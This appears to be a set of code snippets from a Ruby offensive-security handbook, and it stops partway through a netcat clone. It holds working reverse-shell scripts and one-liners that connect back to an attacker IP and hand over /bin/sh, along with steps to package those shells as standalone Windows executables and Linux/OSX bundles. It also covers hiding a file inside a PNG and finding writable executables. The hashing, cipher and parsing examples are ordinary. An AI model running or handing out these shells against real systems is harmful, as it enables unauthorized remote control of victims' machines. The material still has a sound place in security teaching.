["```\n    gem install ocra \n    ```", "```\n#!/usr/bin/env ruby\n# KING SABRI | @KINGSABRI\nrequire 'socket'\nif ARGV[0].nil? || ARGV[1].nil?\n    puts \"ruby #{__FILE__}.rb [HACKER_IP HACKER_PORT]\\n\\n\"\n    exit\nend\nip, port = ARGV\ns = TCPSocket.new(ip,port)\nwhile cmd = s.gets\n  IO.popen(cmd,\"r\"){|io|s.print io.read}\nend \n```", "```\nC:\\Users\\admin\\Desktop>ocra rshell.rb --windows --console \n```", "```\nC:\\Users\\admin\\Desktop>ocra rshell.rb --windows --console\n=== Loading script to check dependencies\nruby C:/Users/admin/Desktop/rshell.rb.rb [HACKER_IP HACKER_PORT]\n\n=== Attempting to trigger autoload of Gem::ConfigFile\n=== Attempting to trigger autoload of Gem::DependencyList\n=== Attempting to trigger autoload of Gem::DependencyResolver\n=== Attempting to trigger autoload of Gem::Installer\n=== Attempting to trigger autoload of Gem::RequestSet\n=== Attempting to trigger autoload of Gem::Source\n=== Attempting to trigger autoload of Gem::SourceList\n=== Attempting to trigger autoload of Gem::SpecFetcher\n=== Attempting to trigger autoload of CGI::HtmlExtension\n=== Detected gem ocra-1.3.5 (loaded, files)\n===     6 files, 191333 bytes\n=== Detected gem io-console-0.4.3 (loaded, files)\n=== WARNING: Gem io-console-0.4.3 root folder was not found, skipping\n=== Including 53 encoding support files (3424768 bytes, use --no-enc to exclude)\n=== Building rshell.exe\n=== Adding user-supplied source files\n=== Adding ruby executable ruby.exe\n=== Adding detected DLL C:/Ruby22/bin/zlib1.dll\n=== Adding detected DLL C:/Ruby22/bin/LIBEAY32.dll\n=== Adding detected DLL C:/Ruby22/bin/SSLEAY32.dll\n=== Adding detected DLL C:/Ruby22/bin/libffi-6.dll\n=== Adding library files\n=== Compressing 10622666 bytes\n=== Finished building rshell.exe (2756229 bytes) \n```", "```\nrshell.exe 192.168.0.14 9911 \n```", "```\nnc -lvp 9911 \n```", "```\nmkdir rshell\ncd rshell \n```", "```\n#!/usr/bin/env ruby\n# KING SABRI | @KINGSABRI\nrequire 'socket'\nif ARGV.size < 2\n  puts \"ruby #{__FILE__} [HACKER_IP] [HACKER_PORT]\\n\\n\"\n  exit 0 \nend\nip, port = ARGV\ns = TCPSocket.open(ip,port).to_i\nexec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",s,s,s) \n```", "```\nruby rshell.rb \n# => ruby rshell.rb [HACKER_IP] [HACKER_PORT] \n```", "```\nmkdir -p rshell-1.0.0-linux-x86/lib/app\ncp rshell.rb rshell-1.0.0-linux-x86/lib/app/\n\nmkdir -p rshell-1.0.0-linux-x86_64/lib/app\ncp rshell.rb rshell-1.0.0-linux-x86_64/lib/app/\n\nmkdir -p rshell-1.0.0-osx/lib/app/\ncp rshell.rb rshell-1.0.0-osx/lib/app/ \n```", "```\nmkdir packaging\ncd packaging\nwget -c  http://d6r77u77i8pq3.cloudfront.net/releases/traveling-ruby-20141215-2.1.5-linux-x86.tar.gz\nwget -c  http://d6r77u77i8pq3.cloudfront.net/releases/traveling-ruby-20141215-2.1.5-linux-x86_64.tar.gz\nwget -c  http://d6r77u77i8pq3.cloudfront.net/releases/traveling-ruby-20141215-2.1.5-osx.tar.gz\ncd ..\n\nmkdir rshell-1.0.0-linux-x86/lib/ruby && tar -xzf packaging/traveling-ruby-20141215-2.1.5-linux-x86.tar.gz -C rshell-1.0.0-linux-x86/lib/ruby\nmkdir rshell-1.0.0-linux-x86_64/lib/ruby && tar -xzf packaging/traveling-ruby-20141215-2.1.5-linux-x86_64.tar.gz -C rshell-1.0.0-linux-x86_64/lib/ruby\nmkdir rshell-1.0.0-osx/lib/ruby && tar -xzf packaging/traveling-ruby-20141215-2.1.5-osx.tar.gz -C rshell-1.0.0-osx/lib/ruby \n```", "```\nrshell/\n |\n +-- rshell.rb\n |\n +-- rshell-linux86/\n |   |\n |   +-- lib/\n |       +-- app/\n |       |   |\n |       |   +-- rshell.rb\n |       |\n |       +-- ruby/\n |           |\n |           +-- bin/\n |           |   |\n |           |   +-- ruby\n |           |   +-- ...\n |           +-- ...\n |\n +-- rshell-linux86_64/\n |   |\n |  ...\n |\n +-- rshell-osx/\n     |\n    ... \n```", "```\ncd rshell-osx\n./lib/ruby/bin/ruby lib/app/rshell.rb\n# => ruby rshell.rb.rb [HACKER_IP  HACKER_PORT]\n\ncd .. \n```", "```\n#!/bin/bash\nset -e\n\n# Figure out where this script is located.\nSELFDIR=\"`dirname \\\"$0\\\"`\"\nSELFDIR=\"`cd \\\"$SELFDIR\\\" && pwd`\"\n\n# Run the actual app using the bundled Ruby interpreter.\nexec \"$SELFDIR/lib/ruby/bin/ruby\" \"$SELFDIR/lib/app/rshell.rb\" \n```", "```\nchmod +x packaging/wrapper.sh\ncp packaging/wrapper.sh rshell-1.0.0-linux-x86/rshell\ncp packaging/wrapper.sh rshell-1.0.0-linux-x86_64/rshell\ncp packaging/wrapper.sh rshell-1.0.0-osx/rshell \n```", "```\ntar -czf rshell-1.0.0-linux-x86.tar.gz rshell-1.0.0-linux-x86\ntar -czf rshell-1.0.0-linux-x86_64.tar.gz rshell-1.0.0-linux-x86_64\ntar -czf rshell-1.0.0-osx.tar.gz rshell-1.0.0-osx\nrm -rf rshell-1.0.0-linux-x86\nrm -rf rshell-1.0.0-linux-x86_64\nrm -rf rshell-1.0.0-osx \n```", "```\n/path-to/rshell-1.0.0-linux-x86/rshell\n# => ruby rshell.rb.rb [HACKER_IP  HACKER_PORT] \n```", "```\nPACKAGE_NAME = \"rshell\"\nVERSION = \"1.0.0\"\nTRAVELING_RUBY_VERSION = \"20150210-2.1.5\"\n\ndesc \"Package your app\"\ntask :package => ['package:linux:x86', 'package:linux:x86_64', 'package:osx']\n\nnamespace :package do\n  namespace :linux do\n    desc \"Package your app for Linux x86\"\n    task :x86 => \"packaging/traveling-ruby-#{TRAVELING_RUBY_VERSION}-linux-x86.tar.gz\" do\n      create_package(\"linux-x86\")\n    end\n\n    desc \"Package your app for Linux x86_64\"\n    task :x86_64 => \"packaging/traveling-ruby-#{TRAVELING_RUBY_VERSION}-linux-x86_64.tar.gz\" do\n      create_package(\"linux-x86_64\")\n    end\n  end\n\n  desc \"Package your app for OS X\"\n  task :osx => \"packaging/traveling-ruby-#{TRAVELING_RUBY_VERSION}-osx.tar.gz\" do\n    create_package(\"osx\")\n  end\nend\n\nfile \"packaging/traveling-ruby-#{TRAVELING_RUBY_VERSION}-linux-x86.tar.gz\" do\n  download_runtime(\"linux-x86\")\nend\n\nfile \"packaging/traveling-ruby-#{TRAVELING_RUBY_VERSION}-linux-x86_64.tar.gz\" do\n  download_runtime(\"linux-x86_64\")\nend\n\nfile \"packaging/traveling-ruby-#{TRAVELING_RUBY_VERSION}-osx.tar.gz\" do\n  download_runtime(\"osx\")\nend\n\ndef create_package(target)\n  package_dir = \"#{PACKAGE_NAME}-#{VERSION}-#{target}\"\n  sh \"rm -rf #{package_dir}\"\n  sh \"mkdir -p #{package_dir}/lib/app\"\n  sh \"cp rshell.rb #{package_dir}/lib/app/\"\n  sh \"mkdir #{package_dir}/lib/ruby\"\n  sh \"tar -xzf packaging/traveling-ruby-#{TRAVELING_RUBY_VERSION}-#{target}.tar.gz -C #{package_dir}/lib/ruby\"\n  sh \"cp packaging/wrapper.sh #{package_dir}/rshell\"\n  if !ENV['DIR_ONLY']\n    sh \"tar -czf #{package_dir}.tar.gz #{package_dir}\"\n    sh \"rm -rf #{package_dir}\"\n  end\nend\n\ndef download_runtime(target)\n  sh \"cd packaging && curl -L -O --fail \" +\n    \"http://d6r77u77i8pq3.cloudfront.net/releases/traveling-ruby-#{TRAVELING_RUBY_VERSION}-#{target}.tar.gz\"\nend \n```", "```\nrake package \n```", "```\nrake package:linux:x86\nrake package:linux:x86_64\nrake package:osx \n```", "```\nrake package DIR_ONLY=1\nrake package:linux:x86 DIR_ONLY=1\nrake package:linux:x86_64 DIR_ONLY=1\nrake package:osx DIR_ONLY=1 \n```", "```\nrshell-1.0.0-linux-x86.tar.gz\nrshell-1.0.0-linux-x86_64.tar.gz\nrshell-1.0.0-osx.tar.gz \n```", "```\nwget rshell-1.0.0-linux-x86_64.tar.gz\n...\ntar xzf rshell-1.0.0-linux-x86_64.tar.gz\ncd rshell-1.0.0-linux-x86_64\n./rshell\n# => ruby rshell.rb.rb [HACKER_IP  HACKER_PORT] \n```", "```\n#!/usr/bin/env ruby\n# KING SABRI | @KINGSABRI\nfile1, file2 = ARGV\nsec_file = File.read file1    # 'file.pdf'\nnor_file = File.read file2    # 'image.png'\nsep = '*------------------------*'\none_file = [nor_file, sep, sec_file]\n\n# Write sec_file, sep, nor_file into steg.png\nFile.open(\"steg.png\", 'wb') do |stg|\n  one_file.each do |f|\n    stg.puts f\n  end\nend\n\n# Read steg.png to be like \"one_file\" array\nrecov_file = File.read('steg.png').force_encoding(\"BINARY\").split(sep).last\n# Write sec_file to hola.pdf\nFile.open('hola.pdf', 'wb') {|file| file.print recov_file} \n```", "```\n#!/usr/bin/env ruby\n# KING SABRI | @KINGSABRI\n# Simple file to hex converter script\n#\nfile_name = ARGV[0]\n\nfile = File.open(file_name , 'rb')\nfile2hex = file.read.each_byte.map { |b| '\\x%02x' % b }.join    # b.to_s(16).rjust(2, '0')\n\nputs file2hex \n```", "```\nruby hex-simple.rb ../assembly/hellolinux \n```", "```\nruby -e \"puts  File.open('hellolinux').read.each_byte.map { |b| '\\x%02X' % b }.join\" \n```", "```\n\\x7F\\x45\\x4C\\x46\\x01\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x03\\x00\\x01\\x00\\x00\\x00\\x80\\x80\\x04\\x08\\x34\\x00\\x00\\x00\\xCC\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x34\\x00\\x20\\x00\\x02\\x00\\x28\\x00\\x04\\x00\\x03\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x04\\x08\\x00\\x80\\x04\\x08\\xA2\\x00\\x00\\x00\\xA2\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x01\\x00\\x00\\x00\\xA4\\x00\\x00\\x00\\xA4\\x90\\x04\\x08\\xA4\\x90\\x04\\x08\\x0E\\x00\\x00\\x00\\x0E\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xB8\\x04\\x00\\x00\\x00\\xBB\\x01\\x00\\x00\\x00\\xB9\\xA4\\x90\\x04\\x08\\xBA\\x0D\\x00\\x00\\x00\\xCD\\x80\\xB8\\x01\\x00\\x00\\x00\\xBB\\x00\\x00\\x00\\x00\\xCD\\x80\\x00\\x00\\x48\\x65\\x6C\\x6C\\x6F\\x2C\\x20\\x57\\x6F\\x72\\x6C\\x64\\x21\\x0A\\x00\\x2E\\x73\\x68\\x73\\x74\\x72\\x74\\x61\\x62\\x00\\x2E\\x74\\x65\\x78\\x74\\x00\\x2E\\x64\\x61\\x74\\x61\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0B\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x80\\x80\\x04\\x08\\x80\\x00\\x00\\x00\\x22\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x11\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\xA4\\x90\\x04\\x08\\xA4\\x00\\x00\\x00\\x0E\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xB2\\x00\\x00\\x00\\x17\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00 \n```", "```\n#!/usr/bin/env ruby\n#\n# Source: http://c2.com/cgi/wiki?HexDumpInManyProgrammingLanguages\n#\ndef hexdump(filename, start = 0, finish = nil, width = 16)\n  ascii = ''\n  counter = 0\n  print '%06x  ' % start\n  File.open(filename).each_byte do |c|\n    if counter >= start\n      print '%02x ' % c\n      ascii << (c.between?(32, 126) ? c : ?.)\n      if ascii.length >= width\n    puts ascii\n    ascii = ''\n    print '%06x  ' % (counter + 1)\n      end\n    end\n    throw :done if finish && finish <= counter\n    counter += 1\n  end rescue :done\n  puts '   ' * (width - ascii.length) + ascii\nend\n\nif $0 == __FILE__\n  if ARGV.empty?\n    hexdump $0\n  else\n    filename = ARGV.shift\n    hexdump filename, *(ARGV.map {|arg| arg.to_i })\n  end\nend \n```", "```\nruby hexdump.rb hellolinux \n```", "```\n000000  7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 .ELF............\n000010  02 00 03 00 01 00 00 00 80 80 04 08 34 00 00 00 ............4...\n000020  cc 00 00 00 00 00 00 00 34 00 20 00 02 00 28 00 ........4\\. ...(.\n000030  04 00 03 00 01 00 00 00 00 00 00 00 00 80 04 08 ................\n000040  00 80 04 08 a2 00 00 00 a2 00 00 00 05 00 00 00 ................\n000050  00 10 00 00 01 00 00 00 a4 00 00 00 a4 90 04 08 ................\n000060  a4 90 04 08 0e 00 00 00 0e 00 00 00 06 00 00 00 ................\n000070  00 10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\n000080  b8 04 00 00 00 bb 01 00 00 00 b9 a4 90 04 08 ba ................\n000090  0d 00 00 00 cd 80 b8 01 00 00 00 bb 00 00 00 00 ................\n0000a0  cd 80 00 00 48 65 6c 6c 6f 2c 20 57 6f 72 6c 64 ....Hello, World\n0000b0  21 0a 00 2e 73 68 73 74 72 74 61 62 00 2e 74 65 !...shstrtab..te\n0000c0  78 74 00 2e 64 61 74 61 00 00 00 00 00 00 00 00 xt..data........\n0000d0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\n0000e0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\n0000f0  00 00 00 00 0b 00 00 00 01 00 00 00 06 00 00 00 ................\n000100  80 80 04 08 80 00 00 00 22 00 00 00 00 00 00 00 ........\".......\n000110  00 00 00 00 10 00 00 00 00 00 00 00 11 00 00 00 ................\n000120  01 00 00 00 03 00 00 00 a4 90 04 08 a4 00 00 00 ................\n000130  0e 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 ................\n000140  00 00 00 00 01 00 00 00 03 00 00 00 00 00 00 00 ................\n000150  00 00 00 00 b2 00 00 00 17 00 00 00 00 00 00 00 ................\n000160  00 00 00 00 01 00 00 00 00 00 00 00             ............ \n```", "```\n# KING SABRI | @KINGSABRI\n# Find all executable, writable files in the path\n#\nrequire 'find'\n\npath = ARGV[0]\n\nsearch = Find.find(path)\n\ndef wx_file(search)\n  search.select do |file|\n    File.file?(file) && File.executable?(file) && File.writable?(file)\n  end  \nend\n\nputs wx_file search \n```", "```\n search.select do |file|\n    File.stat(file).mode.to_s(8)[-3..-1].to_i == 777\n  end \n```", "```\n    gem install nokogiri \n    ```", "```\nrequire 'nokogiri'\nrequire 'open-uri'\n\npage = Nokogiri::HTML(open(\"http://rubyfu.net/content/\"))\npage.css(\".book .book-summary ul.summary li a, .book .book-summary ul.summary li span\").each { |css| puts css.text.strip.squeeze.gsub(\"\\n\", '')} \n```", "```\nRubyFu\nModule 0x0 | Introduction\n0.1\\.  Contribution\n0.2\\.  Beginners\n0.3\\.  Required Gems\n1\\.  Module 0x1 | Basic Ruby Kung Fu\n1.1\\.  String\n1.1.1\\.  Conversion\n1.1.2\\.  Extraction\n1.2\\.  Array\n2\\.  Module 0x2 | System Kung Fu\n2.1\\.  Command Execution\n2.2\\.  File manipulation\n2.2.1\\.  Parsing HTML, XML, JSON\n2.3\\.  Cryptography\n2.4\\.  Remote Shell\n2.4.1\\.  Ncat.rb\n2.5\\.  VirusTotal\n3\\.  Module 0x3 | Network Kung Fu\n3.1\\.  Ruby Socket\n3.2\\.  FTP\n3.3\\.  SSH\n3.4\\.  Email\n3.4.1\\.  SMTP Enumeration\n3.5\\.  Network Scanning\n.\n.\n..snippet.. \n```", "```\n<?xml version=\"1.0\"?>\n<collection shelf=\"New Arrivals\">\n<movie title=\"Enemy Behind\">\n   <type>War, Thriller</type>\n   <format>DVD</format>\n   <year>2003</year>\n   <rating>PG</rating>\n   <stars>10</stars>\n   <description>Talk about a US-Japan war</description>\n</movie>\n<movie title=\"Transformers\">\n   <type>Anime, Science Fiction</type>\n   <format>DVD</format>\n   <year>1989</year>\n   <rating>R</rating>\n   <stars>8</stars>\n   <description>A scientific fiction</description>\n</movie>\n   <movie title=\"Trigun\">\n   <type>Anime, Action</type>\n   <format>DVD</format>\n   <episodes>4</episodes>\n   <rating>PG</rating>\n   <stars>10</stars>\n   <description>Vash the Stampede!</description>\n</movie>\n<movie title=\"Ishtar\">\n   <type>Comedy</type>\n   <format>VHS</format>\n   <rating>PG</rating>\n   <stars>2</stars>\n   <description>Viewable boredom</description>\n</movie>\n</collection> \n```", "```\nrequire 'rexml/document'\ninclude REXML\n\nfile = File.read \"file.xml\"\nxmldoc = Document.new(xmlfile)\n\n# Get the root element\nroot = xmldoc.root\nputs \"Root element : \" + root.attributes[\"shelf\"]\n\n# List of movie titles.\nxmldoc.elements.each(\"collection/movie\") do |e|\n  puts \"Movie Title : \" + e.attributes[\"title\"] \nend\n\n# List of movie types.\nxmldoc.elements.each(\"collection/movie/type\") do |e|\n  puts \"Movie Type : \" + e.text \nend\n\n# List of movie description.\nxmldoc.elements.each(\"collection/movie/description\") do |e|\n  puts \"Movie Description : \" + e.text\nend\n\n# List of movie stars\nxmldoc.elements.each(\"collection/movie/stars\") do |e|\n  puts \"Movie Stars : \" + e.text\nend \n```", "```\nrequire 'nokogiri' \n```", "```\nrequire 'nokogiri'\n# Parse XML file\ndoc = Nokogiri::Slop file\n\nputs doc.search(\"type\").map {|f| t.text}        # List of Types\nputs doc.search(\"format\").map {|f| f.text}      # List of Formats\nputs doc.search(\"year\").map {|y| y.text}        # List of Year\nputs doc.search(\"rating\").map {|r| r.text}      # List of Rating\nputs doc.search(\"stars\").map {|s| s.text}       # List of Stars\ndoc.search(\"description\").map {|d| d.text}      # List of Descriptions \n```", "```\n{\n  \"Vulnerability\": \n  [\n    {\n      \"name\": \"SQLi\",\n      \"details:\": \n        {\n          \"full_name\": \"SQL injection\",\n          \"description\": \"An injection attack wherein an attacker can execute malicious SQL statements\",\n          \"references\": [\n            \"https://www.owasp.org/index.php/SQL_Injection\", \n            \"https://cwe.mitre.org/data/definitions/89.html\"\n            ],\n          \"type\": \"web\"\n        }\n    }\n  ]\n} \n```", "```\nrequire 'json'\nvuln_json = JSON.parse(File.read('vulnerabilities.json')) \n```", "```\n{\"Vulnerability\"=>`\n  [{\"name\"=>\"SQLi\",\n    \"details:\"=>\n     {\"full_name\"=>\"SQL injection\",\n      \"description\"=>\"An injection attack wherein an attacker can execute malicious SQL statements\",\n      \"references\"=>[\"https://www.owasp.org/index.php/SQL_Injection\", \"https://cwe.mitre.org/data/definitions/89.html\"],\n      \"type\"=>\"web\"}}]} \n```", "```\nvuln_json[\"Vulnerability\"].each {|vuln| puts vuln['name']} \n```", "```\nxss = {\"name\"=>\"XSS\", \"details:\"=>{\"full_name\"=>\"Corss Site Scripting\", \"description\"=>\" is a type of computer security vulnerability typically found in web applications\", \"references\"=>[\"https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)\", \"https://cwe.mitre.org/data/definitions/79.html\"], \"type\"=>\"web\"}} \n```", "```\nxss.to_json \n```", "```\nrequire 'digest'\nputs Digest::MD5.hexdigest 'P@ssw0rd' \n```", "```\nrequire 'digest'\nputs Digest::SHA1.hexdigest 'P@ssw0rd' \n```", "```\nrequire 'digest'\n\n# 1\nsha2_256 = Digest::SHA2.new(bitlen = 256) # bitlen could be 256, 384, 512\nsha2_256.hexdigest 'P@ssw0rd'\n\n# 2\nDigest::SHA2.new(bitlen = 256).hexdigest 'P@ssw0rd' \n```", "```\nrequire 'digest'\nputs Digest::SHA256.hexdigest 'P@ssw0rd'\nputs Digest::SHA384.hexdigest 'P@ssw0rd'\nputs Digest::SHA512.hexdigest 'P@ssw0rd' \n```", "```\nrequire 'digest/sha2'\npassword = 'P@ssw0rd'\nsalt = rand(36**8).to_s(36)\nshadow_hash = password.crypt(\"$6$\" + salt) \n```", "```\nrequire 'openssl'\n\ndef split7(str)\n  str.scan(/.{1,7}/)\nend\n\ndef gen_keys(str)\n  split7(str).map do |str7| \n\n    bits = split7(str7.unpack(\"B*\")[0]).inject('') do |ret, tkn| \n      ret += tkn + (tkn.gsub('1', '').size % 2).to_s \n    end\n\n    [bits].pack(\"B*\")\n  end\nend\n\ndef apply_des(plain, keys)\n  dec = OpenSSL::Cipher::DES.new\n  keys.map {|k|\n    dec.key = k\n    dec.encrypt.update(plain)\n  }\nend\n\nLM_MAGIC = \"KGS!@\\#$%\"\ndef lm_hash(password)\n  keys = gen_keys password.upcase.ljust(14, \"\\0\")\n  apply_des(LM_MAGIC, keys).join\nend\n\nputs lm_hash \"P@ssw0rd\" \n```", "```\nrequire 'openssl'\nntlmv1 = OpenSSL::Digest::MD4.hexdigest \"P@ssw0rd\".encode('UTF-16LE')\nputs ntlmv1 \n```", "```\nrequire 'openssl'\nntlmv1 = OpenSSL::Digest::MD4.hexdigest \"P@ssw0rd\".encode('UTF-16LE')\nuserdomain = \"administrator\".encode('UTF-16LE')\nntlmv2 = OpenSSL::HMAC.digest(OpenSSL::Digest::MD5.new, ntlmv1, userdomain)\nputs ntlmv2 \n```", "```\nputs \"*\" + Digest::SHA1.hexdigest(Digest::SHA1.digest('P@ssw0rd')).upcase \n```", "```\nrequire 'digest/md5'\nputs 'md5' + Digest::MD5.hexdigest('P@ssw0rd' + 'admin') \n```", "```\nrequire 'openssl'\nputs OpenSSL::Cipher.ciphers \n```", "```\nrequire \"openssl\"\n\ndata = 'Rubyfu Secret Mission: Go Hack The World!'\n\n# Setup the cipher\ncipher = OpenSSL::Cipher::AES.new('256-CBC')    # Or use: OpenSSL::Cipher.new('AES-256-CBC')\ncipher.encrypt                                  # Initializes the Cipher for encryption. (Must be called before key, iv, random_key, random_iv)\nkey = cipher.random_key                         # If hard coded key, it must be 265-bits length\niv = cipher.random_iv                           # Generate iv\nencrypted = cipher.update(data) + cipher.final  # Finalize the encryption \n```", "```\ndecipher = OpenSSL::Cipher::AES.new('256-CBC')  # Or use: OpenSSL::Cipher::Cipher.new('AES-256-CBC')\ndecipher.decrypt                                # Initializes the Cipher for dencryption. (Must be called before key, iv, random_key, random_iv)\ndecipher.key = key                              # Or generate secure random key: cipher.random_key\ndecipher.iv = iv                                # Generate iv\nplain = decipher.update(encrypted) + decipher.final  # Finalize the dencryption \n```", "```\n#!/usb/bin/env ruby\n#\n# Caesar cipher\n#\n\ndef caesar_cipher(string, shift=1)\n  lowercase, uppercase = ('a'..'z').to_a, ('A'..'Z').to_a\n  lower = lowercase.zip(lowercase.rotate(shift)).to_h\n  upper = uppercase.zip(uppercase.rotate(shift)).to_h\n\n  # One-liner: encrypter = ([*('a'..'z')].zip([*('a'..'z')].rotate(shift)) + [*('A'..'Z')].zip([*('A'..'Z')].rotate(shift))).to_h\n  encrypter = lower.merge(upper)\n  string.chars.map{|c| encrypter.fetch(c, c)}\nend\n\nstring = ARGV[0]\n1.upto(30) do |r|\n  puts \"ROT#{r}) \" + caesar_cipher(string, r).join\nend \n```", "```\n$-> ruby caesar-cypher.rb Fipmti\nROT1) Gjqnuj\nROT2) Hkrovk\nROT3) Ilspwl\nROT4) Jmtqxm\nROT5) Knuryn\nROT6) Lovszo\nROT7) Mpwtap\nROT8) Nqxubq\nROT9) Oryvcr\nROT10) Pszwds\nROT11) Qtaxet\nROT12) Rubyfu   <--\nROT13) Svczgv\nROT14) Twdahw\nROT15) Uxebix\nROT16) Vyfcjy\nROT17) Wzgdkz\nROT18) Xahela\nROT19) Ybifmb\nROT20) Zcjgnc\nROT21) Adkhod\nROT22) Belipe\nROT23) Cfmjqf\nROT24) Dgnkrg\nROT25) Eholsh\nROT26) Fipmti\nROT27) Gjqnuj\nROT28) Hkrovk\nROT29) Ilspwl\nROT30) Jmtqxm \n```", "```\nPlugboard = Hash[*('A'..'Z').to_a.shuffle.first(20)]\nPlugboard.merge!(Plugboard.invert)\nPlugboard.default_proc = proc { |hash, key| key }\n\ndef build_a_rotor\n  Hash[('A'..'Z').zip(('A'..'Z').to_a.shuffle)]\nend\n\nRotor_1, Rotor_2, Rotor_3 = build_a_rotor, build_a_rotor, build_a_rotor\n\nReflector = Hash[*('A'..'Z').to_a.shuffle]\nReflector.merge!(Reflector.invert)\n\ndef input(string)\n  rotor_1, rotor_2, rotor_3 = Rotor_1.dup, Rotor_2.dup, Rotor_3.dup\n\n  string.chars.each_with_index.map do |char, index|\n    rotor_1 = rotate_rotor rotor_1\n    rotor_2 = rotate_rotor rotor_2 if index % 25 == 0\n    rotor_3 = rotate_rotor rotor_3 if index % 25*25 == 0\n\n    char = Plugboard[char]\n\n    char = rotor_1[char]\n    char = rotor_2[char]\n    char = rotor_3[char]\n\n    char = Reflector[char]\n\n    char = rotor_3.invert[char]\n    char = rotor_2.invert[char]\n    char = rotor_1.invert[char]\n\n    Plugboard[char]\n  end.join\nend\n\ndef rotate_rotor(rotor)\n  Hash[rotor.map { |k,v| [k == 'Z' ? 'A' : k.next, v] }]\nend\n\nplain_text = 'IHAVETAKENMOREOUTOFALCOHOLTHANALCOHOLHASTAKENOUTOFME'\nputs \"Encrypted '#{plain_text}' to '#{encrypted = input(plain_text)}'\"\nputs \"Decrypted '#{encrypted}' to '#{decrypted = input(encrypted)}'\"\nputs 'Success!' if plain_text == decrypted \n```", "```\n>> exec('date')\nSun Sep 27 00:39:22 AST 2015\nRubyFu( ~ )-> \n```", "```\n>> system 'date'\nSun Sep 27 00:38:01 AST 2015\n#=> true \n```", "```\nruby -e 'exec(\"/bin/sh 2>&1\")' \n```", "```\nruby -e 'system(\"/bin/sh 2>&1\")' \n```", "```\n>> `date`\n#=> \"Sun Sep 27 00:38:54 AST 2015\\n\" \n```", "```\n>> IO.popen(\"date\") { |f| puts f.gets }\nSun Sep 27 00:40:06 AST 2015\n#=> nil \n```", "```\nrequire 'open3'\nstdin, stdout, stderr = Open3.popen3('dc') \n#=> [#<IO:fd 14>, #<IO:fd 16>, #<IO:fd 18>, #<Process::Waiter:0x00000002f68bd0 sleep>]\n>> stdin.puts(5)\n#=> nil\n>> stdin.puts(10)\n#=> nil\n>> stdin.puts(\"+\")\n#=> nil\n>> stdin.puts(\"p\")\n#=> nil\n>> stdout.gets\n#=> \"15\\n\" \n```", "```\npid = Process.spawn(\"date\")\nSun Sep 27 00:50:44 AST 2015\n#=> 12242 \n```", "```\n>> %x\"date\"\n#=> Sun Sep 27 00:57:20 AST 2015\\n\"\n>> %x[date]\n#=> \"Sun Sep 27 00:58:00 AST 2015\\n\"\n>> %x{date}\n#=> \"Sun Sep 27 00:58:06 AST 2015\\n\"\n>> %x$'date'$\n#=> \"Sun Sep 27 00:58:12 AST 2015\\n\" \n```", "```\nrequire 'rake'\n>> sh 'date'\ndate\nSun Sep 27 00:59:05 AST 2015\n#=> true \n```", "```\n>> `date`\n=> \"Sun Sep 27 01:06:42 AST 2015\\n\"\n>> $?.success?\n=> true \n```", "```\nruby -rsocket -e's=TCPSocket.new(\"VictimIP\",4444);loop do;cmd=gets.chomp;s.puts cmd;s.close if cmd==\"exit\";puts s.recv(1000000);end' \n```", "```\nruby -rsocket -e's=TCPSocket.open(\"192.168.0.13\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",s,s,s)' \n```", "```\nruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"192.168.0.13\",\"4444\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end' \n```", "```\nruby -rsocket -e 'c=TCPSocket.new(\"192.168.0.13\",\"4444\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end' \n```", "```\n#!/usr/bin/env ruby\n# KING SABRI | @KINGSABRI\nrequire 'socket'\nif ARGV[0].nil? || ARGV[1].nil?\n    puts \"ruby #{__FILE__}.rb [HACKER_IP HACKER_PORT]\\n\\n\"\n    exit\nend\nip, port = ARGV\ns = TCPSocket.open(ip,port).to_i\nexec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",s,s,s) \n```", "```\n#!/usr/bin/ruby\nrequire 'optparse'\nrequire 'ostruct'\nrequire 'socket'\n\nclass String\n  def red; colorize(self, \"\\e[1m\\e[31m\"); end\n  def green; colorize(self, \"\\e[1m\\e[32m\"); end\n  def cyan; colorize(self, \"\\e[1;36m\"); end\n  def bold; colorize(self, \"\\e[1m\"); end\n  def colorize(text, color_code)  \"#{color_code}#{text}\\e[0m\" end\nend\n\nclass NetCat\n\n  #\n  # Parsing options\n  #\n  def parse_opts(args)\n    @options = OpenStruct.new\n    opts = OptionParser.new do |opts|\n        opts.banner = \"Usage: #{__FILE__}.rb [options]\"\n        opts.on('-c', '--connect',\n            \"Connect to a remote 